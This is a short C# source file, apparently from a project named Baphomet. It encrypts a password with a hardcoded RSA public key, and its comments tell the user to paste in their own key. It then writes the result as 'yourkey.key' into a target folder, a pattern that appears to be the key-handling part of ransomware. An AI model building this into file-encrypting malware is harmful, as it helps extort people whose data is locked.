using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet.Utilities
{
    public class CryptRSA
    {
        public  void EncryptText(string targetPath ,string password)
        {
            //Pega tu llave publica aqui! / Paste your public key here!
            string publicKey = "<RSAKeyValue><Modulus>t+NC0XkTfoQx3c1G+jD1XC0MyobwbEkVpSPFgy24tb/Q6QlxAsDEf2ZR3r1OHoKcgPVQRZ/gAYgiERdGljRR60wyN9jGjveXuh6pE5q5kXrkJW+gtLg7HTFQJF9vFCHN6GpnTJVUE+0lU3jcyZkQyvEOcfQCQDRx+6qZXZ5aue0=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
            // Convierto el password a un array byte 
            UnicodeEncoding byteConverter = new UnicodeEncoding();
            byte[] dataToEncrypt = byteConverter.GetBytes(password);

            // Creo un array byte para almazenar la data encriptada(password)  
            byte[] encryptedData;
            using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider())
            {
                // Set rsa pulic key   
                rsa.FromXmlString(publicKey);

                encryptedData = rsa.Encrypt(dataToEncrypt, false);
            }
             File.WriteAllBytes(targetPath + "\\yourkey.key", encryptedData);
        }
    }
}
